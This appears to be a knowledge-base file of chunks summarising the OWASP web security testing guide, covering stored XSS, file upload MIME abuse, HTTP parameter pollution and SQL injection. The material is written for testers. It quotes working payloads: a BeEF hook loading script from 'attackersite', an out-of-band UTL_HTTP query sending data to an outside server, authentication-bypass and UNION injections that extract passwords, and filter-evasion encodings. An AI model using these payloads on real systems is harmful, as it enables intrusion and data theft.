{"id": "kb-000958", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Testing for stored XSS (Cross-Site Scripting) involves validating and filtering user inputs to prevent code injection attacks. Key actions include analyzing HTML code and testing input validation."}
{"id": "kb-000959", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of malicious injection outside the input tag: <input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\"> MALICIOUS CODE <!-- />."}
{"id": "kb-000960", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "The page discusses techniques for testing applications for Cross-Site Scripting (XSS) vulnerabilities, specifically focusing on stored XSS attacks."}
{"id": "kb-000961", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Stored XSS allows an attacker to inject malicious scripts into web applications, which are then executed in the browsers of users who load the infected pages."}
{"id": "kb-000962", "section": null, "tags": ["HTTP", "SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "A practical example of stored XSS is provided, where the input '<input class=\"inputbox\" type=\"text\" name=\"email\" size=\"40\" value=\"aaa@aa.com\"><script>alert(document.cookie)</script>' demonstrates how a script can be executed if user input is not properly sanitized."}
{"id": "kb-000963", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Testers are advised to disable JavaScript when submitting input if client-side security controls are in place, and to modify HTTP requests using web proxy tools to test for vulnerabilities."}
{"id": "kb-000964", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "The page highlights various techniques for evading XSS filters, such as replacing strings like 'SCRIPT' or injecting NULL characters to bypass input sanitation mechanisms."}
{"id": "kb-000965", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "The Browser Exploitation Framework (BeEF) can leverage stored XSS by injecting JavaScript hooks that allow attackers to control victim browsers and exploit their sessions."}
{"id": "kb-000966", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of a BeEF injection is given, where the attacker uses '<script src=http://attackersite/hook.js></script>' to execute a remote script when the target user loads the compromised page."}
{"id": "kb-000967", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "The Beef Injection Example targets vulnerable web pages that are accessed by many users with varying privileges, showcasing a method to exploit these vulnerabilities."}
{"id": "kb-000968", "section": null, "tags": ["UPLOAD", "XSS"], "source": "wstg-v4.2.pdf", "text": "File upload functionalities in web applications need careful testing to prevent the upload of malicious HTML content that can lead to Cross-Site Scripting (XSS) attacks. If HTML or TXT files are permitted, they can contain XSS payloads."}
{"id": "kb-000969", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Penetration testers must ensure that file uploads do not allow arbitrary MIME types to be set during the upload process, as this can lead to security vulnerabilities."}
{"id": "kb-000970", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "An example HTTP POST request for file upload illustrates the mechanics of file upload vulnerability. The request contains headers indicating the name and type of the file being uploaded.\nExample:\nPOST /fileupload.aspx HTTP/1.1 ...\nContent-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.txt\"\nContent-Type: text/plain\ntest"}
{"id": "kb-000971", "section": null, "tags": ["UPLOAD", "XSS"], "source": "wstg-v4.2.pdf", "text": "MIME mishandling attacks pose a significant threat, where seemingly innocuous file types like JPG and GIF can be exploited to deliver XSS attacks if their MIME type is incorrectly set to text/html by the server."}
{"id": "kb-000972", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "An example of a forged HTTP POST request demonstrates how an attacker can upload a GIF file set with an HTML content type to exploit MIME handling flaws.\nExample:\nContent-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.gif\"\nContent-Type: text/html Gray-box testing involves partial knowledge of the application by the pen-tester, which distinguishes it from black-box testing."}
{"id": "kb-000973", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Recommended steps for gray-box testing include entering special or invalid characters into input fields, analyzing the application's responses, checking input validation controls, and examining how the input is stored in the back-end system."}
{"id": "kb-000974", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "When analyzing source code in gray-box testing, testers should pay attention to how stored input is rendered, especially in languages like PHP, ASP, and JSP which use predefined variables/functions for handling input requests."}
{"id": "kb-000975", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Key PHP variables to investigate include $_GET, $_POST, $_REQUEST, and $_FILES, which are used for handling HTTP GET and POST requests and file uploads."}
{"id": "kb-000976", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In ASP and JSP, there are equivalent functions for handling input data: Request.QueryString and Request.Form in ASP, and request.getParameter in JSP."}
{"id": "kb-000977", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Various tools can assist in web security testing: PHP Charset Encoder (PCE) for text encoding, Hackvertor for encoding/obfuscation, BeEF for demonstrating browser vulnerabilities, XSS-Proxy for XSS attacks, Burp Proxy as an interactive testing tool, and XSS Assistant for testing cross-site scripting flaws."}
{"id": "kb-000978", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP Parameter Pollution (HPP) occurs when a web application receives multiple HTTP parameters with the same name, which may lead to unexpected application behavior."}
{"id": "kb-000979", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The lack of guidance in current HTTP standards, such as RFC 3986 and RFC 2396, creates diverse handling by web application components for parameters with duplicate names, which can be exploited by attackers."}
{"id": "kb-000980", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Exploitation of HPP can bypass input validation, trigger application errors, or modify internal variable values, thereby leading to potential vulnerabilities."}
{"id": "kb-000981", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "A notable example of HPP exploitation involved ModSecurity's SQL Injection Core Rules, where an attacker was able to bypass filters by crafting a request with concatenated parameters that ultimately produced a malicious SQL command when processed by the application server."}
{"id": "kb-000982", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Another example involves Apple Cups, where an HPP vulnerability allowed an attacker to trigger a Cross-Site Scripting (XSS) vulnerability by manipulating a request to include duplicate parameters, leading to JavaScript execution on the host website."}
{"id": "kb-000983", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Blogger experienced a critical HPP vulnerability that permitted malicious users to take ownership of a victim's blog by using specific HTTP requests to manipulate the server's handling of parameters."}
{"id": "kb-000984", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The web security flaw described involves an authentication mechanism that fails to properly check all occurrences of the same HTTP parameter, specifically highlighting that the security check was only performed on the first 'blogID' parameter instead of the intent of the operation tied to the second one."}
{"id": "kb-000985", "section": null, "tags": ["CONF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The expected behavior of various web technologies when handling multiple occurrences of the same HTTP parameter can differ significantly, which can lead to security vulnerabilities such as HTTP Parameter Pollution (HPP). For example, ASP.NET and ASP will concatenate all occurrences, while PHP and IBM Lotus Domino may only consider the last occurrence, depending on the server configuration."}
{"id": "kb-000986", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for HPP involves identifying the backend system and understanding its parsing methods, which is critical due to the varying behaviors of different web frameworks. Manual testing is emphasized as necessary for effective detection of HPP due to the limits of automated tools that often generate false positives."}
{"id": "kb-000987", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "To effectively test for HTTP parameter pollution, testers should conduct manual assessments on all pages and actions of the application and be mindful of both client-side and server-side components that could exhibit HPP vulnerabilities. HTTP Parameter Pollution (HPP) vulnerabilities arise from improperly handled input parameters in web applications. To test for HPP vulnerabilities, users must identify forms or actions allowing user input, particularly focusing on GET and POST requests. GET parameters can be easily modified in the browser's navigation bar, whereas POST data may require an intercepting proxy to manipulate."}
{"id": "kb-000988", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To identify potential HPP issues, the tester should duplicate an input parameter with a different value to see how the application processes it: e.g., from `http://example.com/?search_string=kittens` to `http://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies`. After submitting modified requests, the response should be analyzed to see how the application responds to the different parameters."}
{"id": "kb-000989", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Possible responses include returning all values, some combination of the input parameters, an empty result, or an error page, indicating how the web application handles duplicate parameters."}
{"id": "kb-000990", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The behavior across an entire application tends to be consistent, but whether this behavior indicates a vulnerability depends on the app's input validation mechanisms."}
{"id": "kb-000991", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A systematic testing approach involves three HTTP requests: (1) the standard parameter request, (2) a tampered value, and (3) the combined parameters; comparison of these responses can reveal potential HPP vulnerabilities."}
{"id": "kb-000992", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "If the combined response is different from the others, it indicates an impedance mismatch that could be exploited for security vulnerabilities."}
{"id": "kb-000993", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Client-side HTTP Parameter Pollution (HPP) vulnerabilities can be audited effectively through manual testing as automated methods may not reliably detect them."}
{"id": "kb-000994", "section": null, "tags": ["AUTHN", "CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "To identify client-side HPP vulnerabilities, testers should look for forms or actions that allow user input and display that input back to the user, making search pages a better option than login boxes."}
{"id": "kb-000995", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing for HPP vulnerabilities involves inserting a specific payload, such as '%26HPP_TEST', into HTTP parameters and monitoring for URL-decoded occurrences like '&HPP_TEST' or '&amp;HPP_TEST'. It's crucial to examine responses for HPP vectors found within data-containing elements, src, href attributes, or forms actions."}
{"id": "kb-000996", "section": null, "tags": ["BUSINESS", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The presence of a vulnerability depends on factors like input validation and filtering mechanisms, as well as the application's business logic."}
{"id": "kb-000997", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Client-side HPP vulnerabilities can also impact query string parameters used in XMLHttpRequests, runtime attribute creation, and plugin technologies like Adobe Flash. Resources mentioned include OWASP ZAP for both passive and active scanning of potential vulnerabilities."}
{"id": "kb-000998", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "**Definition of SQL Injection**: SQL injection testing evaluates the application's vulnerability by checking the ability to inject data causing execution of user-controlled SQL queries against the database."}
{"id": "kb-000999", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "**Vulnerability Detection**: SQL injection vulnerabilities are identified when an application uses unvalidated user input to construct SQL queries."}
{"id": "kb-001000", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "**Consequences of SQL Injection**: Successful exploitation can lead to unauthorized access to data, manipulations, administrative operations on the database, file recovery, and the ability to execute commands on the OS."}
{"id": "kb-001001", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "**Mechanism of SQL Injection**: SQL injection involves injecting a partial or complete SQL query via user input that alters the expected execution of SQL commands."}
{"id": "kb-001002", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "**Examples of SQL Queries**: An example of a vulnerable SQL command is `select title, text from news where id=$id`, where `$id` is user input; an injection like `10 or 1=1` manipulates SQL logic to gain unauthorized data access."}
{"id": "kb-001003", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "**Types of SQL Injection Attacks**: There are three main classes: 1) **Inband**: Same channel used for data extraction; 2) **Out-of-band**: Different channel for data retrieval (e.g., email); 3) **Inferential (or Blind)**: No data transfer; relies on application behavior to infer information about the database."}
{"id": "kb-001004", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "**Error Messages as Indicators**: If an application reveals SQL error messages, attackers can exploit these messages to better understand the structure of the original query and find ways to inject SQL code correctly."}
{"id": "kb-001005", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "**Common Techniques for Exploiting SQL Injection**: While not detailed in the provided text, five common techniques are referenced, including potential combinations of methods like union operator and out-of-band techniques. **Union Operator**: A method used in SQL injection that allows combining two SELECT queries into one result set. **Boolean Condition Checking**: This involves using true/false conditions during SQL injection tests to identify vulnerabilities."}
{"id": "kb-001006", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**Error Based Injection**: This technique generates an error response from the database that can provide clues for refining the injection method. **Out-of-band Technique**: Using a different communication channel, such as an HTTP connection, to retrieve injected data."}
{"id": "kb-001007", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Time Delay Injections**: This method employs the use of commands to intentionally delay responses from the database, indicating potential vulnerabilities when outputs are not directly available."}
{"id": "kb-001008", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "**Test Objectives**: Key goals include identifying SQL injection points and assessing the severity and potential access levels of these injections."}
{"id": "kb-001009", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "**Detection Techniques**: Understanding application interaction with a Database Server is crucial in identifying SQL injection points in various scenarios, such as authentication forms and search engines."}
{"id": "kb-001010", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**Initial Testing**: Inserting single quotes (') or semicolons (;) into input fields can help identify improperly filtered inputs that can cause syntax errors in SQL queries."}
{"id": "kb-001011", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Error Messages as Indicators**: Specific error messages can provide insights into SQL vulnerabilities; for example, an 'unclosed quotation mark' error indicates an injection flaw. **Comment Delimiters**: Using comment syntax like '--' or '/* */' can alter SQL query behavior, providing means for exploitation."}
{"id": "kb-001012", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Type Mismatch Errors**: Injecting strings into numeric fields can generate syntax errors, revealing further information about the database's structure and vulnerabilities."}
{"id": "kb-001013", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Error messages can be a valuable source of information for testers conducting injection attacks; however, many applications provide minimal feedback such as a '500 Server Error'. This necessitates the use of blind injection techniques."}
{"id": "kb-001014", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "In SQL injection testing, it's crucial to test each input field separately. Only one variable should change at a time to accurately identify vulnerable parameters."}
{"id": "kb-001015", "section": null, "tags": ["AUTHN", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "An example of a classic SQL injection is demonstrated through the SQL query: SELECT * FROM Users WHERE Username='$username' AND Password='$password'. If manipulated input such as '1' or '1' = '1' is used, the query effectively bypasses authentication by always returning true (OR 1=1)."}
{"id": "kb-001016", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The URL crafted for this injection from the example provided would be: http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1, highlighting how SQL injections can occur via GET requests."}
{"id": "kb-001017", "section": null, "tags": ["AUTHN", "CRYPTO", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Another SQL query example is: SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password'))). Issues here arise both from the use of parentheses and the MD5 hash function."}
{"id": "kb-001018", "section": null, "tags": ["API", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "To exploit the parentheses issue in the query, additional closing parentheses can be added. To circumvent the MD5 condition, an injection might involve appending a comment symbol (like '/*' for many DBMS) to ignore the rest of the statement."}
{"id": "kb-001019", "section": null, "tags": ["AUTHN", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The appropriate injection values in this case would be: $username = '1' or '1' = '1'))/*' and $password = 'foo', leading to an altered SQL query that could effectively bypass standard authentication mechanisms. In web security testing, SQL injection can occur when user input is included in an SQL statement without proper validation or escaping."}
{"id": "kb-001020", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of a vulnerable URL is: http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo, which exploits the input to manipulate the SQL query."}
{"id": "kb-001021", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The operator LIMIT <num> can be used to control the number of records returned from a database, making it easier to bypass certain authentication checks by ensuring exactly one record is returned."}
{"id": "kb-001022", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In a SQL query context, if an application checks for a valid product by comparing ID, testers can manipulate the SQL condition using logical operators: e.g., using 'AND 1=2' to return nothing, and 'AND 1=1' to validate the presence of data."}
{"id": "kb-001023", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Stacked queries allow executing multiple SQL statements in one request, potentially leading to security vulnerabilities if the input is not properly sanitized. Example includes appending a second SQL command: http://www.example.com/product.php?id=10; INSERT INTO users (…) to exploit the database."}
{"id": "kb-001024", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Identifying the back end database using error messages from the application is a key technique in SQL injection testing. Examples of specific error messages from different DBMS include:"}
{"id": "kb-001025", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "1. **MySQL Error:** 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1.' 2. **Oracle Error:** 'ORA-00933: SQL command not properly ended.' 3. **MS SQL Server Error:** 'Microsoft SQL Native Client error ‘80040e14’. Unclosed quotation mark after the character string.' 4. **PostgreSQL Error:** 'Query failed: ERROR: syntax error at or near \"’\" at character 56.' Testers can also utilize SQL queries like: - MySQL: `SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1` - SQL Server: `SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1`"}
{"id": "kb-001026", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Using concatenation techniques for string injections is effective when error messages are not revealed, with the following syntaxes for different systems: 1. **MySQL:** ‘test’ + ‘ing’ 2. **SQL Server:** ‘test’ ‘ing’ 3. **Oracle:** ‘test’||’ing’ 4. **PostgreSQL:** ‘test’||’ing’"}
{"id": "kb-001027", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The UNION operator in SQL injection allows testers to combine the results of a forged query with the original query, facilitating the retrieval of values from columns of other tables."}
{"id": "kb-001028", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL Injection Example: The text discusses an example of SQL injection where a query is manipulated to extract data (like credit card numbers) from a database. The SQL command illustrated is: SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable."}
{"id": "kb-001029", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Importance of ALL Keyword: The use of the keyword 'ALL' is emphasized as necessary to circumvent queries that utilize the 'DISTINCT' keyword, ensuring all results are retrieved without duplicates."}
{"id": "kb-001030", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Finding Column Count: To exploit SQL injection vulnerabilities, one of the first steps includes determining the number of columns in the SELECT statement using the 'ORDER BY' clause, which helps to avoid syntax errors."}
{"id": "kb-001031", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Error Messages as Feedback: The example shows how error messages, like 'Unknown column' or 'All cells in a column must have the same datatype', provide crucial feedback for testers during SQL injection exploitation."}
{"id": "kb-001032", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Column Type Testing: After identifying the number of columns, testers can identify their data types in a systematic manner by using different types (e.g., NULL), helping to ascertain what kind of data is expected in each column."}
{"id": "kb-001033", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Using LIMIT Clause: If data retrieval only shows the first result, testers can apply a 'LIMIT' clause or set an invalid value to manipulate which data is returned from the database."}
{"id": "kb-001034", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Boolean Exploitation Technique: This technique is useful for blind SQL injection scenarios where the outcome of the SQL query execution is not visible. The tester may not receive specific error messages, making it necessary to deduce information through HTTP response codes instead. Inference methods can be used to recover values from database fields by executing boolean queries and analyzing the responses. An example of an exploitable SQL injection is shown with the query: SELECT field1, field2, field3 FROM Users WHERE Id='$Id'. The method allows for extracting data character by character using standard SQL functions such as: - SUBSTRING(text, start, length): retrieves a substring starting at the specified position. - ASCII(char): returns the ASCII value of the input character. - LENGTH(text): returns the character count of the input text. An inferential query example is: SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'. The example above checks if the first character of the username has an ASCII value of 97 (which corresponds to 'a')."}
{"id": "kb-001035", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "To differentiate between true and false responses, a query that always returns false can be used: SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'."}
{"id": "kb-001036", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "If the response from the inferential query matches the false query's response, the test can proceed to the next character by adjusting the parameters."}
{"id": "kb-001037", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The process for a blind SQL injection attack involves using a specific template matching strategy to identify vulnerabilities. By comparing the response templates from multiple SQL requests, a tester can infer valuable information about the target database."}
{"id": "kb-001038", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The termination condition for the inference procedure can be determined by utilizing the SUBSTRING and LENGTH functions. Specifically, comparing a character to the ASCII code 0 (null) indicates either the completion of the inference or the presence of a null character in the analyzed string."}
{"id": "kb-001039", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The SQL query to be used for testing a specific character's presence in a username would be: SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'. A true result indicates the end of the inference, while a false result suggests the need for further analysis of subsequent characters."}
{"id": "kb-001040", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Blind SQL injection attacks often require a high volume of queries, thus automation tools are beneficial for testers to effectively manage the testing process."}
{"id": "kb-001041", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Error based exploitation techniques are employed when other methods of SQL injection (like UNION) are not feasible. This approach strives to trigger errors in the database that can help reveal critical information about the underlying data."}
{"id": "kb-001042", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "For example, an attacker might send an SQL request such as: http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )-- to extract user information from the database by forcing the database to return an error message when it fails to find the requested hostname, revealing the database user's name."}
{"id": "kb-001043", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Out of band exploitation techniques are particularly relevant in blind SQL injection scenarios, where the outcome of a normal request doesn't provide discernible data. This can involve utilizing database management system functions to initiate an out-of-band connection."}
{"id": "kb-001044", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL injection is a code injection technique that exploits a security vulnerability in an application's software by manipulating SQL queries."}
{"id": "kb-001045", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "An example of a SQL injection attack: a malicious request to a web application could look like: `http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80'||(SELECT user FROM DUAL)--`, which aims to execute an HTTP request to another server with the result of a SQL query."}
{"id": "kb-001046", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Time delay exploitation technique is useful in Blind SQL Injection scenarios. The technique involves sending an injected query and monitoring the server's response time to infer true conditions."}
{"id": "kb-001047", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "For instance, a MySql injection request for checking the MySql version could be: `http://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false')--`, where a 10-second response delay indicates that the condition was true."}
{"id": "kb-001048", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Stored procedure injection occurs when a stored procedure is executed without properly sanitizing user inputs, potentially leading to code execution of malicious SQL."}
{"id": "kb-001049", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The example illustrates the vulnerability of SQL injection in stored procedures due to unsanitized user input, making the system susceptible to unauthorized access and manipulation."}
{"id": "kb-001050", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The first stored procedure 'user_login' dynamically constructs an SQL query using user-provided credentials, which poses a significant security risk as attackers can alter the query by injecting malicious input such as ' or 1=1'."}
{"id": "kb-001051", "section": null, "tags": ["AUTHN", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "The second stored procedure 'get_report' shows how an attacker can manipulate the list of columns to execute malicious commands that could affect the database, such as updating passwords without authorization."}
{"id": "kb-001052", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Automated tools like SQLMap can perform SQL injection attacks efficiently by testing for vulnerabilities and exploiting them automatically, highlighting the need for robust security practices in web applications."}
{"id": "kb-001053", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL Injection Signature Evasion Techniques are used to bypass security measures like Web Application Firewalls (WAFs) and Intrusion Prevention Systems (IPSs)."}
{"id": "kb-001054", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Whitespace manipulation is a technique where spaces are added or removed from SQL commands in ways that do not alter the logic of the SQL but can evade detection by security systems. For example, changing 'or 'a'='a'' to 'or 'a' = 'a'' doesn't affect its execution but may bypass filters."}
{"id": "kb-001055", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Adding special characters like new lines or tabs can preserve the execution of SQL statements. For example, using syntax 'a' = 'a' does not change the logic of the SQL query."}
{"id": "kb-001056", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Null bytes (%00) can be utilized in SQL injection attempts to bypass filters. An example of such usage is inserting a null byte before a SQL injection payload like '%00' UNION SELECT password FROM Users WHERE username='admin'--."}
{"id": "kb-001057", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Using SQL inline comments (e.g., '''/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--') enables attackers to obscure SQL statements and bypass filters, retaining validity."}
{"id": "kb-001058", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "URL Encoding transforms the SQL injection statement for safe transmission through browsers or other systems. For example, the SQL injection statement ' UNION SELECT password FROM Users WHERE name='admin'-- can be URL encoded to %27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--."}
{"id": "kb-001059", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Character Encoding can obscure the original SQL keywords. For instance, using the char() function allows for replacement of characters; char(114,111,111,116) translates to 'root', changing ' UNION SELECT password FROM Users WHERE name='root'-- into ' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--."}
{"id": "kb-001060", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "String Concatenation can be used to break apart SQL keywords and avoid detection by filters. An example for MS SQL engine demonstrates this: changing select 1 to EXEC('SEL' + 'ECT 1') effectively disguises the command."}
{"id": "kb-001061", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Hex Encoding is a technique that uses Hexadecimal encoding to replace original SQL statement characters, allowing for values such as 'root' to be represented as '726F6F74'."}
{"id": "kb-001062", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL statements can be altered using HEX values, such as 'Select user from users where name = 726F6F74' or 'Select user from users where name = unhex('726F6F74')'."}
{"id": "kb-001063", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Variables can be declared in SQL to execute dynamic SQL injection statements. For example, the SQL injection statement 'Union Select password' can be set to a variable with 'DECLARE @SQLivar nvarchar(80); SET @SQLivar = N'UNI' + N'ON' + N' SELECT' + N'password'; EXEC(@SQLivar)."}
{"id": "kb-001064", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Different ways to express the condition 'or 1 = 1' include: \"OR 'SQLi' = 'SQL'+'i'\", \"OR 'SQLi' > 'S'\", \"or 20 > 1\", \"OR 2 between 3 and 1\", and various other expressions that resolve to true, showing the diverse methods of crafting SQL injection conditions."}
{"id": "kb-001065", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To prevent SQL injection vulnerabilities, it is advised to consult the SQL Injection Prevention CheatSheet, Database Security CheatSheet, and Input Validation CheatSheet."}
{"id": "kb-001066", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Tools recommended for testing include: SQL Injection Fuzz Strings from wfuzz tool (Fuzzdb), sqlbftools, sqlmap (an automatic SQL injection tool), and MySqloit (MySql Injection takeover tool). Web-based PL/SQL applications utilize the PL/SQL Gateway to translate web requests into database queries."}
{"id": "kb-001067", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The PL/SQL Gateway acts as a proxy server by processing requests, extracting relevant package names and procedures, and sending them to the database server for execution."}
